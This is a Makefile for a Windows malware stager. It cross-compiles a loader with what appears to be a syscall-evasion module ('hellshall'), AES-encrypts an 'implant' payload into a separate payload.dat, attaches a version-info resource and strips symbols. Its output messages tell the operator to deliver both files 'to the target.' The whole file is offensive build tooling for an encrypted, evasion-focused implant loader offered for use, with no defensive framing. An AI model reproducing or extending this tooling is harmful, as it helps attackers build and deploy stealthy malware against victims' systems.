# stager Makefile — two-file delivery (stager.exe + payload.dat)
#
# Usage:
#   make PICO=/path/to/implant.crystal.bin
#   make PICO=/path/to/implant.crystal.bin OUTPUT=/path/to/stager.exe
#
# Outputs:
#   <OUTPUT>              stager EXE (~17 KB, no embedded payload)
#   $(dir <OUTPUT>)/payload.dat   AES-256-CBC encrypted PICO

CC      := x86_64-w64-mingw32-gcc
WINDRES := x86_64-w64-mingw32-windres
CFLAGS  := -Wall -Os -mwindows -ffunction-sections -fdata-sections
LDFLAGS := -s -Wl,--gc-sections -ladvapi32 -lbcrypt

PICO    ?= $(error PICO is not set — run: make PICO=/path/to/implant.crystal.bin)
OUTPUT  ?= ../build/stager.exe
PAYDAT  := $(dir $(OUTPUT))payload.dat

.PHONY: all clean

all: $(OUTPUT)
	@echo ""
	@echo "[+] Deliver BOTH files to the target:"
	@echo "      $(abspath $(OUTPUT))"
	@echo "      $(abspath $(PAYDAT))"
	@echo "    stager.exe reads payload.dat from its own directory."

# ── Step 1: AES-256-CBC encrypt PICO → payload.dat + C key header ─────────
#    gen_payload.py writes both files in one call; track via payload_key.h.
payload_key.h: $(PICO) gen_payload.py
	@mkdir -p "$(dir $(PAYDAT))"
	python3 gen_payload.py "$(abspath $(PICO))" "$(abspath $(PAYDAT))" payload_key.h

# ── Step 2: compile version info resource ─────────────────────────────────
resource.o: resource.rc
	$(WINDRES) resource.rc -o resource.o

# ── Step 3: link final EXE ────────────────────────────────────────────────
$(OUTPUT): stager.c hellshall.c hellshall.h payload_key.h resource.o
	@mkdir -p "$(dir $(OUTPUT))"
	$(CC) $(CFLAGS) -o "$(abspath $(OUTPUT))" stager.c hellshall.c resource.o $(LDFLAGS)

clean:
	rm -f payload_key.h resource.o
